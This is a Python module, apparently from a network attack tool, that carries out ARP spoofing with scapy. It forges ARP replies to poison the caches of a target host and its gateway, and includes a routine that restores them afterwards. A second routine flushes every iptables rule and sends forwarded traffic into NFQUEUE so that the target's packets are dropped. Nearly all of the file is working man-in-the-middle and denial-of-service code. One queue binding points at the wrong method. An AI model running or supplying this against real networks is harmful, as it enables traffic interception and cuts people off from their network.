from . import CollectData
import sys,subprocess,time
from scapy.all import ARP, Ether, srp, send, sendp
import netfilterqueue

class MainFunctions:
    def __init__(self):
        self.ipForward =True
        

    def arpSpoof(self,interface,targetIP):
        print("ARP Spoofing Running .... use Ctrl + c to Restore and QUIT")
        targetMAC = CollectData.CollectData().get_target_mac_address(interface, targetIP)
        gatewayIP =CollectData.CollectData().get_default_gateway_ip(interface)
        gatewayMAC = CollectData.CollectData().get_default_gateway_mac(interface)
        while True:
            target_arp = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=gatewayIP)
            gateway_arp = ARP(op=2, pdst=gatewayIP, hwdst=gatewayMAC, psrc=targetIP)
            send(target_arp,verbose=0)
            send(gateway_arp,verbose=0)
            time.sleep(2)

    def stopARP(self,interface,targetIP):
        targetMAC = CollectData.CollectData().get_target_mac_address(interface, targetIP)
        gatewayIP =CollectData.CollectData().get_default_gateway_ip(interface)
        gatewayMAC = CollectData.CollectData().get_default_gateway_mac(interface)
        arp_response = ARP(op=2,pdst=targetIP,hwdst=targetMAC,psrc=gatewayIP,hwsrc=gatewayMAC)
        send(arp_response,verbose=False,count=4)

    #trap packet Callback
    def trap_Packets_callback(self,packet):
        packet.drop()


    #trap packets in NFQUEUE
    def trapPackets(self):
        try:
            subprocess.run(['sudo', 'iptables', '-F'], check=True)
            subprocess.run(['sudo', 'iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '8'], check=True)
            print("NFQUEUE rule added to iptables FORWARD chain.")
        except subprocess.CalledProcessError as e:
            print("Error adding NFQUEUE rule:", e)
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(8, self.trapPackets)
        queue.run()
        


        




